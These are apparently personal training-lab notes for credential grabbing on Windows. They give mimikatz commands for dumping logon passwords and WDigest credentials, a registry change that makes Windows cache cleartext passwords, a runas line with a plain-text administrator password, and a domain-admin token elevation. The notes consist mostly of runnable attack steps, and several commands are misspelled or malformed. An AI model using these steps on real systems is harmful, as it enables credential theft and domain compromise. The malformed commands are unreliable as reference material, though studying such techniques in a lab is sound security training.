# Credential Grabbing
> remoted into the client as...someone local/domain? Admin?
> 
1. Fucking mimikatz basic bitches.
2. Powershell:
`cd c:\Users\Public\Desktop\LAB_FILES\assets`
3. `expand-archive mimikatz_trunk.zip`
4. Run mimikatz meow.
   1. `cd mimikatz_trunk\x64`
   2. `.\mimikatz.exe`
   3. In Mimikatz terminal:
      1. `mimikatz # privilege::debug`
      2. `mimikatz # log m.txt`
      3. `mimikatz # sekurlsa::logonpasswords`
      4. `mimikatz # sekurlsa::wdigest`
5. In a separate powershell window:
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1
runas /user:wheel\Administrator
pw:12qwaszx!@QWASZX
```
>runas is done to actually store the password

6. Back in mimikatz:
   1. `mimikatz # sekursla::logonpasswords`
   2. `sekursla::wdigest`
>Yay clear text pw!

8. Elevate
`mimkatz # token::elevate /domainadmin`